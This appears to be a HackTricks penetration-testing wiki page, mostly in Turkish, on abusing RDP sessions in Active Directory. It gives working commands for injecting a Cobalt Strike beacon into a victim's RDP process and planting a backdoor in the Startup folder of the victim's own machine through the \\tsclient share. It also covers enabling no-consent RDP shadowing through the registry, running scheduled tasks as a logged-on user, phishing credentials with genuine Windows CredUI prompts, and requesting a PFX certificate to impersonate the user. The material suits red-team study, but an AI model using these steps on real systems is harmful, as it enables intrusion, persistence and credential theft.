# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

If the **external group** has **RDP access** to any **computer** in the current domain, an **attacker** could **compromise that computer and wait for him**.

Once that user has accessed via RDP, the **attacker can pivot to that users session** and abuse its permissions in the external domain.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
**diğer araçlarla oturumları çalmanın diğer yollarına** [**bu sayfadan göz atın.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Bir kullanıcı, kendisini bekleyen bir **saldırganın** bulunduğu bir makineye **RDP üzerinden erişim sağlarsa**, saldırgan **kullanıcının RDP oturumuna bir beacon enjekte edebilir** ve **kurban RDP üzerinden erişim sağlarken sürücüsünü bağladıysa**, **saldırgan sürücüye erişebilir**.

Bu durumda **startup folder** içine bir **backdoor** yazarak **kurbanın** **asıl bilgisayarını** **ele geçirebilirsiniz**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Bir host üzerinde **local admin** yetkisine sahipseniz ve kurbanın zaten **active RDP session**'ı varsa, **parolayı çalmadan veya LSASS dumping yapmadan** bu masaüstünü **görüntüleyebilir/kontrol edebilirsiniz**.<sup>[[1]](#references)</sup>

Bu, şu konumda depolanan **Remote Desktop Services shadowing** policy'sine bağlıdır:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
İlginç değerler:

- `0`: Devre dışı
- `1`: `EnableInputNotify` (kontrol, kullanıcı onayı gerekli)
- `2`: `EnableInputNoNotify` (kontrol, **kullanıcı onayı gerekmiyor**)
- `3`: `EnableNoInputNotify` (salt görüntüleme, kullanıcı onayı gerekli)
- `4`: `EnableNoInputNoNotify` (salt görüntüleme, **kullanıcı onayı gerekmiyor**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Bu özellikle RDP üzerinden bağlanan ayrıcalıklı bir kullanıcı kilidi açık bir masaüstü, KeePass session, MMC console, browser session veya admin shell bıraktığında kullanışlıdır.

## Logged-On User Olarak Scheduled Tasks

**local admin** iseniz ve hedef kullanıcı **currently logged on** durumundaysa, Task Scheduler kodu **şifresi olmadan bu kullanıcı olarak** başlatabilir.<sup>[[1]](#references)[[4]](#references)</sup>

Bu, kurbanın mevcut logon session'ını bir execution primitive'e dönüştürür:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notlar:

- Kullanıcı **oturum açmış değilse**, Windows genellikle kendisi olarak çalışacak bir task oluşturmak için parolayı gerektirir.
- Kullanıcı **oturum açmışsa**, task mevcut oturum açma bağlamını yeniden kullanabilir.
- Bu, LSASS'e dokunmadan kurban oturumu içinde GUI eylemleri gerçekleştirmek veya binary'leri başlatmak için pratik bir yöntemdir.

## Kurban Oturumundan CredUI Prompt Abuse

**Shadow RDP** veya **bu kullanıcı olarak çalışan bir scheduled task** aracılığıyla **kurbanın interaktif masaüstü içinde** çalıştırma yeteneği elde ettiğinizde, CredUI API'lerini kullanarak **gerçek bir Windows credential prompt** görüntüleyebilir ve kurbanın girdiği kimlik bilgilerini ele geçirebilirsiniz.<sup>[[1]](#references)</sup>

İlgili API'ler:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipik akış:

1. Kurban oturumunda bir binary başlatın.
2. Mevcut domain branding ile eşleşen bir domain-authentication prompt görüntüleyin.
3. Döndürülen auth buffer'ı unpack edin.
4. Sağlanan kimlik bilgilerini doğrulayın ve geçerli kimlik bilgileri girilene kadar isteğe bağlı olarak prompt'u göstermeye devam edin.

Bu, prompt'un sahte bir HTML formu yerine standart Windows API'leri tarafından oluşturulması nedeniyle **on-host phishing** için kullanışlıdır.

## Kurban Bağlamında PFX İsteme

Aynı **scheduled-task-as-user** primitive'i, oturum açmış kurban olarak bir **certificate/PFX** istemek için kullanılabilir. Bu certificate daha sonra parola hırsızlığını tamamen önleyerek, o kullanıcı olarak **AD authentication** gerçekleştirmek için kullanılabilir.<sup>[[1]](#references)[[5]](#references)</sup>

Yüksek seviyeli akış:

1. Kurbanın oturum açtığı bir host üzerinde **local admin** yetkisi elde edin.
2. **Scheduled task** kullanarak enrollment/export mantığını kurban olarak çalıştırın.
3. Ortaya çıkan **PFX**'i export edin.
4. PFX'i PKINIT / certificate-based AD authentication için kullanın.

Devam niteliğindeki abuse işlemleri için AD CS sayfalarına bakın:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Referanslar

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
